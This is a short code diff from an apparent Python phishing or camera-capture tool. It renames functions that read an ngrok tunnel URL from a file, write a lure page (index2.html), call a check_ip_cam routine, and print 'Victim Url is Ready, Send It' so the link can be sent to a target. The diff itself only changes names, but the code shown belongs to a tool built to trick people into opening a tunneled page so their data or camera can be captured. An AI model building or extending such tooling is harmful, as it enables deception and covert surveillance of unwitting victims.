@@ -37,7 +37,7 @@ def check_ip_cam():
             return check_ip_cam()
 
 
-def start_server_php():
+def php_data():
     url_file_to_read = open('url_data.txt', 'r')
     link_to_find = re.compile(r'https://[0-9a-z]*\.ngrok.io') # this will only finds word
     for line in url_file_to_read :                            # this will find line in given txt file
@@ -51,7 +51,7 @@ def start_server_php():
                 url_file_to_read.close()
                 os.system('del url_data.txt')
             check_ip_cam()
-def start_server_html():
+def html_data():
     url_file_to_read = open('url_data.txt', 'r')
     link_to_find = re.compile(r'https://[0-9a-z]*\.ngrok.io') # this will only finds word
     for line in url_file_to_read :                            # this will find line in given txt file
@@ -63,7 +63,7 @@ def start_server_html():
             with open('index2.html', 'w') as outfile:
                 outfile.write(data)                 # Writing data
             url_file_to_read.close()                       
-            start_server_php()
+            php_data()
 def catch_url():
     url_file_to_read = open('url_data.txt', 'r')
     regex = re.compile(r'https://[0-9a-z]*\.ngrok.io')
@@ -73,7 +73,7 @@ def catch_url():
         for url in ngrok_url:
             print(colored(f"Victim Url is Ready, Send It : {url}" ,'green'))
             url_file_to_read.close()
-            start_server_html()
+            html_data()
 def ngrok():
     try:
         url = "http://127.0.0.1:4040/api/tunnels"
